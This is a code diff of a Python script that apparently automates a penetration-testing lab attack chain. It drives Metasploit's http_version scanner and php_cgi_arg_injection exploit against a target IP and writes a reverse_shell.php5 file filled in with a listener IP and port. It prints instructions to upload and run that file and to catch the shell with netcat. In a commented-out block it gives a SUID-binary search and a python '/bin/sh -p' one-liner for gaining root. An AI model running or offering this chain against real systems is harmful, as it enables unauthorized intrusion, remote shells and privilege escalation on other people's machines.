@@ -1,23 +1,34 @@
 from inspect import Parameter
 import os
+import getpass
+from matplotlib.pyplot import hist
 from numpy import mat
 from packaging import version
 from subprocess import Popen, PIPE
 import re
+from termios import tcflush, TCIFLUSH
+import sys
+
 Default = False
 
-def get_output_data(outputLines, Data, block_Out):
+def concatenate_cmd(args):
+    cmd = ""
+    for e in args:
+        cmd += e + " "
+    return cmd
+
+def get_output_data(Data, block_Out):
     for para in block_Out:
         try: # if Data doesn't contain para, we give it as None
             Data[para]
         except KeyError:
             Data[para] = None
         if Data[para] == None:
-            user_input = input("please find value of \"{para}\" in above output, and enter it:".format(para=para))
+            user_input = input("please find value of \"{para}\" in above output, and enter it (true/false):".format(para=para))
             if user_input != '':
-                if user_input == 'True' or user_input == 'true':
+                if user_input.lower()[0] == 't':
                     Data[para] = True
-                elif user_input == 'False' or user_input == 'false':
+                elif user_input.lower()[0] == 'f' :
                     Data[para] = False
                 else:
                     Data[para] = user_input
@@ -27,22 +38,30 @@ def get_output_data(outputLines, Data, block_Out):
 def check_output_data(Data, block_Out):
     match = True
     for para in block_Out:
-        if para not in Data.keys():
+        if Data[para] == None:
             match = False
-        else:
-            if Data[para] == None:
-                match = False
     return match
 
+def give_hint(hints, args):
+    # flush input buffer, in case there are any unexpected user input before that affect input()
+    tcflush(sys.stdin, TCIFLUSH)
+    # user_input = input('press Enter to continue...\n')
+    cmd = concatenate_cmd(args)
+    if hints!=None:
+        for hint in hints:
+            if ("<cmd>") in hint:
+                hint =  hint.replace("<cmd>", cmd)
+            print(hint)
+            user_input = input('press Enter to continue...\n')
+
 class Function():
-    def http_version(func_in, Data, args, cmd, block_In, block_Out):
+    def http_version(func_in, Data, args, block_In, block_Out, block_hint):
         # - msfconsole
         # - wait for 15s (msfconsole opening)
         # - use auxiliary/scanner/http/http_version
         # - set RHOSTS {IP}
         # - run
         # - (assume get Apache/2.4.6)
-        match = check_output_data(Data, block_Out)
 
         configFile=open('meta.rc','w')
         configFile.write('use auxiliary/scanner/http/http_version\n')
@@ -63,16 +82,14 @@ class Function():
                     match = True
 
             print(outputLine)     
-            
+        
+        match = check_output_data(Data, block_Out)
         return Data, match
-            
 
-    def php_cgi_arg_injection(func_in, Data, args, cmd, block_In, block_Out):
+    def php_cgi_arg_injection(func_in, Data, args, block_In, block_Out, block_hint):
         # use exploit/multi/http/php_cgi_arg_injection
         # - set RHOSTS {IP}
         # - run
-        match = check_output_data(Data, block_Out)
-
         configFile=open('meta.rc','w')
         configFile.write('use exploit/multi/http/php_cgi_arg_injection\n')
         configFile.write(f"set RHOST {func_in['IP']}\n")
@@ -86,11 +103,10 @@ class Function():
             if re.search("session [0-9] opend", outputLine)!=None:
                 match = True
             print(outputLine)        
-        
+        match = check_output_data(Data, block_Out)
         return Data, match
 
-    def metasploit(func_in, Data, args, cmd, block_In, block_Out):
-        match = check_output_data(Data, block_Out)
+    def metasploit(func_in, Data, args, block_In, block_Out, block_hint):
         script_name = ""
         for arg in args:
             if ".rc" in arg:
@@ -129,15 +145,15 @@ class Function():
 
             print(outputLine)  
 
+        match = check_output_data(Data, block_Out)
         return Data, match 
         
-    def print_something(func_in, Data, args, cmd, block_In, block_Out):
-        match = check_output_data(Data, block_Out)
+    def print_something(func_in, Data, args, block_In, block_Out, block_hint):
         print("class chain is running~~")
-        return Data, match
-
-    def gobuster(func_in, Data, args, cmd, block_In, block_Out):
         match = check_output_data(Data, block_Out)
+        return Data, match
+    '''
+    def gobuster(func_in, Data, args, block_In, block_Out, block_hint):
         proc = Popen(['gobuster', 'dir', '-u', func_in['IP'], '-w', '/usr/share/wordlists/dirb/common.txt'], stdout=PIPE)
         for stdout_line in iter(proc.stdout.readline, b''):
             # code below just for getting apache version
@@ -147,42 +163,64 @@ class Function():
                 match = True
                 return Data, match
         # os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
-        return Data, match
-
-    def create_file(func_in, Data, args, cmd, block_In, block_Out):
         match = check_output_data(Data, block_Out)
+        # return Data, match
+
+    def netcat(func_in, Data, args, block_In, block_Out, block_hint):
+        cmd = ""
+        for e in args:
+            cmd += e + " "
+        print(f'\nPlease open another terminal and enter `nc {cmd}{func_in["port"]}`.')
+        result = input("After done, press enter to move on next step.\n")
+        match = check_output_data(Data, block_Out)
+        return Data, match
+    '''
+    def create_file(func_in, Data, args, block_In, block_Out, block_hint):
         try:
-            with open('/home/kali/Desktop/reverse_shell.php5', 'w') as f:
+            with open(f'/home/{getpass.getuser()}/Desktop/reverse_shell.php5', 'w') as f:
                 file = args[0]
-                for i in range(len(args)):
-                    file = file.replace("REPLACE_IT", Data[block_In[i]])
+                # for i in range(len(args)):
+                    # file = file.replace("REPLACE_IT_IP", Data[block_In[i]])
+                file = file.replace("REPLACE_IT_IP", Data[block_In[0]])
+                file = file.replace("REPLACE_IT_PORT", Data[block_In[1]])
                 f.write(file)
         except FileNotFoundError:
-            print('Fail to create a file on path:/home/kali/Desktop/')
-        
-        
-        return Data, match
-
-    def netcat(func_in, Data, args, cmd, block_In, block_Out):
-        match = check_output_data(Data, block_Out)
-        os.system(f"nc {Data['argument']} {func_in['port']}")
-        return Data, match
-
-    def get_root(func_in, Data, args, cmd, block_In, block_Out):
+            print(f'Fail to create a file on path:/home/{getpass.getuser()}/Desktop/')
+        print(f"\nGo to /home/{getpass.getuser()}/Desktop, you would find reverse_shell.php5.")
+        print(f"Upload it to the {Data['IP']}/panel page.")
+        print(f"Go to the {Data['IP']}/uploads page, click the file to execute (Make sure you listening to the port first).\n")
+        result = input("After you get shell, press enter to move on next step.\n")
         match = check_output_data(Data, block_Out)
         return Data, match
 
-    def magic_function(func_in, Data, args, cmd, block_In, block_Out):
-        for input_token in func_in:
-            if ("<" + input_token + ">") in cmd:
-                new_cmd =  cmd.replace("<" + input_token + ">", Data[input_token])
-        print("in magic_function excute:", new_cmd.split(" "))
-        proc = Popen(new_cmd.split(" "), stdout=PIPE)
-        temp = open('temp.txt', 'w')
-        temp.truncate(0)
-        for stdout_line in iter(proc.stdout.readline, b''):
-            print("{}".format(stdout_line.decode('utf-8')).rstrip()) 
-            temp.write("{}".format(stdout_line.decode('utf-8')).rstrip())
-        Data = get_output_data(temp, Data, block_Out)
+    '''
+    def get_root(func_in, Data, args, block_In, block_Out, block_hint):
+        print('\nPlease enter `find / -user root -perm -4000 -exec ls -ldb {} \; | grep root` in shell you got.')
+        result = input("If you see python has root permission, enter yes, else enter no.\n")
+        if result != "no":
+            print('\nEnter `python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'` in shell, and you will be root.\n')
+        else:
+            print("\nSorry we can't help :(\n")
+        match = check_output_data(Data, block_Out)
+        return Data, match
+    '''
+    def magic_function(func_in, Data, args, block_In, block_Out, block_hint):
+        for i in range(len(args)):
+            for input_token in func_in:
+                if ("<" + input_token + ">") in args[i]:
+                    args[i] =  args[i].replace("<" + input_token + ">", Data[input_token])
+        if args!=None and args!=[]:
+            if  args[0]!='NOEXE' :
+                print("in magic_function excute:", concatenate_cmd(args))
+                proc = Popen(args, stdout=PIPE)
+                temp = open('temp.txt', 'w')
+                temp.truncate(0)
+                for stdout_line in iter(proc.stdout.readline, b''):
+                    print("{}".format(stdout_line.decode('utf-8')).rstrip()) 
+                    temp.write("{}\n".format(stdout_line.decode('utf-8')).rstrip())
+            else:
+                args.remove('NOEXE')
+        give_hint(block_hint, args)
+        Data = get_output_data(Data, block_Out)
         match = check_output_data(Data, block_Out)
         return Data, match
